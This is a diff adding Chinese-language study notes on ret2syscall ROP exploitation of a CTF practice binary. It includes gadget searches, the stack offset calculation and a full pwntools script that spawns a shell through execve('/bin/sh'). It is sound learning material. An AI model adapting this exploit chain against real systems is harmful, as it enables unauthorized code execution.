@@ -231,3 +231,160 @@ p.sendline(payload)
 p.interactive()
 ```
 
+### ret2syscall
+
+原理
+
+ret2syscall，即控制程序执行系统调用，获取 shell。
+
+系统调用。。需要重温计组了。
+
+```bash
+[*] '/mnt/f/github/pwn-study/Linux-pwn/rop'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+利用 `execve("/bin/sh",NULL,NULL)` 获取shell。
+
+其中，系统调用号为 `0xb` ，第一个参数为 `/bin/sh` 的地址，第二、三个参数均为0。
+
+我们用ROPgadgets以控制这些寄存器。
+
+首先寻找控制 `$eax` 的 gadgets：
+
+```bash
+ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
+```
+
+得到：
+
+```bash
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080bb196 : pop eax ; ret
+0x0807217a : pop eax ; ret 0x80e
+0x0804f704 : pop eax ; ret 3
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+```
+
+wp选取第二个作为gadgets。
+
+接下来寻找 `$ebx` 的gadgets：
+
+```bash
+ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
+```
+
+得到：
+
+```bash
+0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
+0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
+0x080be23f : pop ebx ; pop edi ; ret
+0x0806eb69 : pop ebx ; pop edx ; ret
+0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
+0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
+0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
+0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
+0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
+0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
+0x08048913 : pop ebx ; pop esi ; pop edi ; ret
+0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
+0x08049a94 : pop ebx ; pop esi ; ret
+0x080481c9 : pop ebx ; ret
+0x080d7d3c : pop ebx ; ret 0x6f9
+0x08099c87 : pop ebx ; ret 8
+0x0806eb91 : pop ecx ; pop ebx ; ret
+0x0806336b : pop edi ; pop esi ; pop ebx ; ret
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+0x0805c820 : pop esi ; pop ebx ; ret
+0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0807b6ed : pop ss ; pop ebx ; ret
+```
+
+这里选取了
+
+```
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+```
+
+作为gadgets，因为它可以同时控制三个寄存器。
+
+此外要获得 `/bin/sh` 的地址：
+
+```bash
+ROPgadget --binary rop  --string '/bin/sh'
+```
+
+得到：
+
+```
+Strings information
+============================================================
+0x080be408 : /bin/sh
+```
+
+接下来要找到 `int 0x80` 的地址：
+
+```bash
+ROPgadget --binary rop  --only 'int'
+```
+
+得到：
+
+```
+Gadgets information
+============================================================
+0x08049421 : int 0x80
+0x080938fe : int 0xbb
+0x080869b5 : int 0xf6
+0x0807b4d4 : int 0xfc
+
+Unique gadgets found: 4
+```
+
+接下来我们用gdb调试，查看main的栈帧。
+
+此时 `esp = 0xffffce00` ，`ebp = 0xffffce88` ，`v4 = 0xffffce1c` ，要覆盖的栈的大小为 `0xce88-0xcd1c+0x4=0x70` 。
+
+这样前期的准备就相应完成了。
+
+接下来payload是什么形式的呢？
+
+首先是覆盖到返回地址，接下来要调整参数。
+
+对于 eax 而言，其值为 0xb，则压入地址再压参数；
+
+对于ebx, ecx, edx而言，压入顺序为edx, ecx, ebx；因此按照相应顺序压入即可。
+
+```
+payload = 'a'*0x70 + 
+```
+
+查看wp，用了 pwntools 的 flat 特性。
+
+构造payload如下：
+
+```python
+
+from pwn import *
+
+eax_addr = 0x080bb196
+edcbx_addr = 0x0806eb90
+binsh_addr = 0x080be408
+int80_addr = 0x08049421
+
+payload = flat(['a'*0x70,eax_addr,0xb,edcbx_addr,0,0,binsh_addr,int80_addr])
+p = process('./rop')
+p.sendlineafter("What do you plan to do?\n", payload)
+p.interactive()
+```
+
